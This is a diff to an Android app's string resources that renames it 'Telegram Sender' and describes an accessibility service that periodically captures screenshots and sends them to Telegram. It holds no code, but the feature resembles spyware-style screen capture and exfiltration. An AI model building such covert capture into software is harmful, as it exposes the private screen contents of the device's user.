@@ -1,3 +1,4 @@
 <resources>
-    <string name="app_name">TelegramSender</string>
+    <string name="app_name">Telegram Sender</string>
+    <string name="accessibility_service_description">This service is used to capture screenshots periodically and send them to Telegram.</string>
 </resources>
